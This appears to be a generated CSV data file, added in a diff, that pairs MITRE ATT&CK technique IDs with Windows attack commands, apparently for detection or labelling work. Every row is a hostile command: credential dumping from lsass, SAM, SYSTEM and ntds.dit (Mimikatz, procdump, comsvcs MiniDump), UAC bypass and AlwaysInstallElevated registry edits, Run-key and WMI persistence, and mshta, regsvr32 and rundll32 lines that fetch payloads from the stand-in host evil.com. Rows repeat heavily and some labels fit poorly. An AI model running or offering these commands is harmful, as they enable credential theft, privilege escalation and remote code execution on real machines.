+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,dotnet sys_drv.dll
+T1087,net localgroup administrators
+T1003,procdump.exe -ma lsass.exe sys_drv.dmp
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/sys_drv.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,pypykatz lsa minidump payload.dmp
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,netsh interface show interface
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dnx.exe debug.dll
+T1087,dsquery user -name admin*
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\debug.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/debug.exe"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,"rundll32.exe sys_drv.dll, Execute"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/sys_drv.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/debug.sct scrobj.dll
+T1087,net user /domain svc_sql
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v debug /d ""rundll32.exe debug.dll,EntryPoint"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/debug.exe"
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net user /domain admin
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 4221 C:\Windows\Temp\lsass.dmp full"
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\test.dll')
+T1087,dsquery user -name it_dept*
+T1003,pypykatz lsa minidump test.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""test_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""test.exe"" /f"
+T1129,Import-Module -Name 'C:\Windows\Temp\debug.dll' -Function *
+T1087,quser /server:localhost
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""debug_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/debug.exe"
+T1016,arp -a
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""debug.exe"" /f"
+T1129,[Reflection.Assembly]::LoadFile('C:\Users\Public\debug.dll')
+T1087,net user /domain backup_user
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\debug.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/debug.sct"")"
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,Import-Module -Name 'C:\Windows\Temp\update.dll' -Function *
+T1087,dsquery user -name it_dept*
+T1003,"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 2022 C:\Windows\Temp\lsass.dmp full"
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"rundll32.exe url.dll,OpenURL http://evil.com/update.exe"
+T1016,ipconfig /all
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,dnx.exe sys_drv.dll
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\sys_drv.dll,Run"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,"rundll32.exe sys_drv.dll, Execute"
+T1087,cmd /c 'whoami /groups & whoami /priv'
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""sys_drv_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""sys_drv.exe"" /f"
+T1129,"rundll32.exe payload.dll, Execute"
+T1087,"wmic useraccount get name,sid"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""payload_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/payload.sct"")"
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,net localgroup administrators
+T1003,procdump.exe -ma lsass.exe update.dmp
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,arp -a
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,"wmic useraccount get name,sid"
+T1003,vssadmin create shadow /for=C:
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""update_filter"", EventNameSpace=""root\cimv2"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,netstat -ano | findstr LISTENING
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,quser /server:localhost
+T1003,Invoke-Mimikatz -Command 'lsadump::sam'
+T1546,"wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name=""svc_helper_filter"", EventNameSpace=""root\cimv2"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,ipconfig /all
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""svc_helper.exe"" /f"
+T1129,regsvr32.exe /s /u /i:http://evil.com/update.sct scrobj.dll
+T1087,"wmic useraccount get name,sid"
+T1003,esentutl.exe /y /v /ss C:\Windows\ntds\ntds.dit /d C:\Windows\Temp\ntds.dit
+T1546,"reg add ""HKCU\Environment"" /v UserInitMprLogonScript /t REG_SZ /d ""rundll32.exe C:\temp\update.dll,Run"""
+T1566,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://evil.com/update.sct"")"
+T1016,route print
+T1112,"reg.exe add ""HKCU\Software\Classes\mscfile\shell\open\command"" /ve /t REG_SZ /d ""update.exe"" /f"
+T1129,$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)
+T1087,Get-LocalUser | Where-Object { $_.Enabled -eq $true }
+T1003,reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
+T1546,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /d ""rundll32.exe payload.dll,EntryPoint"""
+T1566,"cmd.exe /c ""mshTa.exe http://evil.com/payload.hta"""
+T1016,route print
+T1112,reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
